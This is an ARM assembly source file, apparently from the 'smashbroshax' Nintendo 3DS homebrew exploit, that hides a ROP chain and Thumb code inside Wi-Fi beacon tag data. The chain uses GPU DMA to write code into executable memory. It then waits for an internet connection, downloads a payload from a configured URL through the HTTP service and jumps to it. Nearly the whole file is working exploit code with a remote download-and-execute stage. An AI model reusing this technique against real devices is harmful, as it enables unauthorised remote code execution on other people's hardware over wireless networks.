.arm
.section .init
.global _start

#include "smashbroshax.h"

@ Beacon tag data for custom OUI-type 0x80. The inital ROP-chain in smashbros_beaconoui15.s loads this ROP-chain data.

_start:
.byte 0x00, 0x1f, 0x32 @ OUI (offset 0x0)
.byte 0x80 @ OUI type

ropstart:
.word POP_LRPC
.word POP_PC @ lr

.word POP_R0R4SLIPPC
.word TMPBUF_ADR @ r0, dst
.word (arm11code-_start) + BEACONTAGDATA_OUITYPE80_ADR @ r1, src
.word 0x400 @ r2, size
.word 0 @ r3
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word MEMCPY

.word POP_R0R4SLIPPC
.word TMPBUF_ADR @ r0, buf
.word 0x400 @ r1, size
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word GSPGPU_FLUSHDCACHE

.word POP_R0R4SLIPPC
.word TMPBUF_ADR @ r0, srcaddr
.word 0 @ r1, dstaddr (actual value gets loaded by the following ROP gadget)
.word 0x400 @ r2, size
.word 0 @ r3, width0
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word ROP_LDRR1R5_MOVR0R8_BLXR7 @ See smashbros_beaconoui15.s.
.word POP_R0R4SLIPPC @ lr

.word GXLOW_CMD4

.word 0 @ sp0 height0
.word 0 @ sp4 width1
.word 0 @ sp8 height1
.word 0x8 @ sp12 flags
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word POP_R0R4SLIPPC
.word 1000000000 @ r0
.word 0 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word POP_LRPC
.word POP_PC @ lr

.word SVCSLEEPTHREAD @ Delay 1 second so that the above cmd can finish, then jump to the loaded code.

.word 0x00100000

arm11code:
add r1, pc, #1
bx r1
.thumb

bl init_sp

bl overwrite_framebufs

ldr r0, =LOCALWLAN_SHUTDOWN
blx r0

bl ACU_WaitInternetConnection

arm11code_finish:
b arm11code_finish

.pool

.fill ((_start + 0xfc) - .), 1, 0xffffffff
.byte 0xff, 0xff @ Pad the tag-data to 0xfe-bytes.
.byte 0xff, 0xff @ Padding, tagid/tagsize bytes would be located here in memory.

tag1:
.byte 0x00, 0x1f, 0x32 @ OUI (offset 0x100)
.byte 0x81 @ OUI type

tag1_code:

ACU_GetWifiStatus:
push {r0, r1, r4, lr}
blx get_cmdbufptr
mov r4, r0

mov r1, #0xd
lsl r1, r1, #16
str r1, [r4, #0]

ldr r0, [sp, #0]
ldr r0, [r0]
blx svcSendSyncRequest
cmp r0, #0
bne ACU_GetWifiStatus_end
ldr r0, [r4, #4]
ldr r2, [sp, #4]
ldr r1, [r4, #8]
str r1, [r2]

ACU_GetWifiStatus_end:
pop {r1, r2, r4, pc}
.pool

ACU_WaitInternetConnection:
sub sp, sp, #12

add r0, sp, #4
add r1, sp, #8
ldr r2, =0x753a6361
str r2, [r1]
mov r2, #4
mov r3, #0
ldr r4, =SRV_GETSERVICEHANDLE
blx r4
cmp r0, #0
bne ACU_WaitInternetConnection_end

ACU_WaitInternetConnection_lp:
add r0, sp, #4
add r1, sp, #8
bl ACU_GetWifiStatus
cmp r0, #0
bne ACU_WaitInternetConnection_lp
ldr r0, [sp, #8]
cmp r0, #1
bne ACU_WaitInternetConnection_lp

ldr r0, [sp, #4]
blx svcCloseHandle

ACU_WaitInternetConnection_end:
add sp, sp, #12
bl download_payload
.pool

.arm

.type svcCloseHandle, %function
svcCloseHandle:
svc 0x23
bx lr

.type svcSendSyncRequest, %function
svcSendSyncRequest:
svc 0x32
bx lr

.type get_cmdbufptr, %function
get_cmdbufptr:
mrc 15, 0, r0, cr13, cr0, 3
add r0, r0, #0x80
bx lr

.thumb

HTTPC_sendcmd:
push {r0, r1, r2, r3, r4, lr}
blx get_cmdbufptr
mov r4, r0

ldr r1, [sp, #12]
str r1, [r4, #0]
ldr r1, [sp, #4]
str r1, [r4, #4]
ldr r1, [sp, #8]
str r1, [r4, #8]

ldr r0, [sp, #0]
ldr r0, [r0]
blx svcSendSyncRequest
cmp r0, #0
bne HTTPC_sendcmd_end
ldr r0, [r4, #4]

HTTPC_sendcmd_end:
add sp, sp, #16
pop {r4, pc}
.pool

HTTPC_Initialize:
push {r0, r1, r4, lr}
blx get_cmdbufptr
mov r4, r0

ldr r1, =0x00010044
str r1, [r4, #0]
ldr r1, =0x1000
str r1, [r4, #4]
mov r1, #0x20
str r1, [r4, #8]
mov r1, #0
str r1, [r4, #16]
str r1, [r4, #20]

ldr r0, [sp, #0]
ldr r0, [r0]
blx svcSendSyncRequest
cmp r0, #0
bne HTTPC_Initialize_end
ldr r0, [r4, #4]

HTTPC_Initialize_end:
pop {r1, r2, r4, pc}
.pool

HTTPC_InitializeConnectionSession:
mov r2, #0x20
ldr r3, =0x00080042
b HTTPC_sendcmd
.pool

HTTPC_SetProxyDefault:
ldr r3, =0x000e0040
b HTTPC_sendcmd
.pool

HTTPC_CloseContext:
ldr r3, =0x00030040
b HTTPC_sendcmd
.pool

HTTPC_BeginRequest:
ldr r3, =0x00090040
b HTTPC_sendcmd
.pool

.fill ((tag1 + 0xfc) - .), 1, 0xffffffff
.byte 0xff, 0xff @ Pad the tag-data to 0xfe-bytes.
.byte 0xff, 0xff @ Padding, tagid/tagsize bytes would be located here in memory.

tag2:
.byte 0x00, 0x1f, 0x32 @ OUI (offset 0x200)
.byte 0x82 @ OUI type

tag2_code:

HTTPC_CreateContext: @ r0=handle*, r1=ctxhandle*, r2=urlbuf*, r3=urlbufsize
push {r0, r1, r2, r3, r4, lr}
blx get_cmdbufptr
mov r4, r0

ldr r1, =0x00020082
str r1, [r4, #0]
ldr r1, [sp, #12]
str r1, [r4, #4]
lsl r1, r1, #4
mov r2, #0xa
orr r1, r1, r2
str r1, [r4, #12]
ldr r2, [sp, #8]
str r2, [r4, #16]
mov r3, #1
str r3, [r4, #8]

ldr r0, [sp, #0]
ldr r0, [r0]
blx svcSendSyncRequest
cmp r0, #0
bne HTTPC_CreateContext_end
ldr r0, [r4, #4]
cmp r0, #0
bne HTTPC_CreateContext_end
ldr r2, [sp, #4]
ldr r1, [r4, #8]
str r1, [r2]

HTTPC_CreateContext_end:
add sp, sp, #16
pop {r4, pc}
.pool

HTTPC_ReceiveData: @ r0=handle*, r1=ctxhandle, r2=buf*, r3=bufsize
push {r0, r1, r2, r3, r4, lr}
blx get_cmdbufptr
mov r4, r0

ldr r1, =0x000B0082
str r1, [r4, #0]
ldr r1, [sp, #4]
str r1, [r4, #4]
ldr r1, [sp, #12]
str r1, [r4, #8]
lsl r1, r1, #4
mov r2, #0xc
orr r1, r1, r2
str r1, [r4, #12]
ldr r2, [sp, #8]
str r2, [r4, #16]

ldr r0, [sp, #0]
ldr r0, [r0]
blx svcSendSyncRequest
cmp r0, #0
bne HTTPC_ReceiveData_end
ldr r0, [r4, #4]

HTTPC_ReceiveData_end:
add sp, sp, #16
pop {r4, pc}

download_payload:
push {lr}
sub sp, sp, #24

mov r4, #0

add r0, sp, #4
add r1, sp, #8
ldr r3, =0x70747468
str r3, [r1, #0]
ldr r3, =0x433a
str r3, [r1, #4]
mov r2, #6
mov r3, #0
ldr r4, =SRV_GETSERVICEHANDLE
blx r4
cmp r0, #0
bne download_payload_end

add r0, sp, #16
add r1, sp, #8
mov r2, #6
mov r3, #0
ldr r4, =SRV_GETSERVICEHANDLE
blx r4
cmp r0, #0
bne download_payload_end

add r0, sp, #4
bl HTTPC_Initialize
cmp r0, #0
bne download_payload_endhttp

add r0, sp, #4
add r1, sp, #20
adr r2, payloadurl
adr r3, payloadurl_end
sub r3, r3, r2
bl HTTPC_CreateContext
cmp r0, #0
bne download_payload_endhttp

add r0, sp, #16
ldr r1, [sp, #20]
bl HTTPC_InitializeConnectionSession
cmp r0, #0
bne download_payload_endhttp

add r0, sp, #16
ldr r1, [sp, #20]
bl HTTPC_BeginRequest
cmp r0, #0
bne download_payload_endhttp

add r0, sp, #16
ldr r1, [sp, #20]
ldr r6, =TMPBUF_ADR
mov r2, r6
ldr r3, =0x4000
bl HTTPC_ReceiveData
cmp r0, #0
bne download_payload_endhttp

add r0, sp, #16
ldr r1, [sp, #20]
bl HTTPC_CloseContext
cmp r0, #0
bne download_payload_endhttp
b download_payload_stage2

.fill ((tag2 + 0xfc) - .), 1, 0xffffffff
.byte 0xff, 0xff
.byte 0xff, 0xff

tag3:
.byte 0x00, 0x1f, 0x32 @ OUI (offset 0x300)
.byte 0x83 @ OUI type

tag3_code:

.pool

download_payload_stage2:
mov r4, #1

download_payload_endhttp:
ldr r0, [sp, #4]
blx svcCloseHandle

ldr r0, [sp, #16]
blx svcCloseHandle

cmp r4, #0
beq download_payload_end

ldr r7, =0x1000
lsl r1, r7, #2

mov r0, r6
ldr r2, =GSPGPU_FLUSHDCACHE
blx r2

mov r0, r6 @ srcaddr
ldr r1, =GXLOWCMD4_DSTADR_PTR
ldr r1, [r1]
lsl r2, r7, #8
add r1, r1, r2 @ dstaddr
ldr r2, =0x4000 @ size
bl cpydat_gxlowcmd4

ldr r0, =1000000000
mov r1, #0
ldr r2, =SVCSLEEPTHREAD
blx r2

mov r1, #0
mov r2, r1

download_payload_memclr:
str r2, [r6, r1]
add r1, r1, #4
cmp r1, r7
blt download_payload_memclr

ldr r1, =GXLOW_CMD4
str r1, [r6, #0x1c]
ldr r1, =GSPGPU_FLUSHDCACHE
str r1, [r6, #0x20]
mov r1, #0xd @ flags
str r1, [r6, #0x48]
ldr r1, =GSPGPU_SERVHANDLEADR
str r1, [r6, #0x58]

mov r0, r6
lsl r1, r7, #9
blx r1

download_payload_end:
b download_payload_end
.pool

overwrite_framebufs:
ldr r0, =0x30000000
ldr r1, =0x1f000000
ldr r2, =0x100000

cpydat_gxlowcmd4: @ r0=srcadr, r1=dstadr, r2=size
push {r4, r5, lr}
sub sp, sp, #32

mov r3, #8
str r3, [sp, #12] @ flags
mov r3, #0 @ width0

ldr r5, =GXLOW_CMD4
blx r5

add sp, sp, #32
pop {r4, r5, pc}
.pool

init_sp:
ldr r0, =(TMPBUF_ADR+0x5000)
mov sp, r0
bx lr
.pool

payloadurl:
.string PAYLOADURL
.align 2
payloadurl_end:

.fill ((tag3 + 0xfc) - .), 1, 0xffffffff
.byte 0xff, 0xff

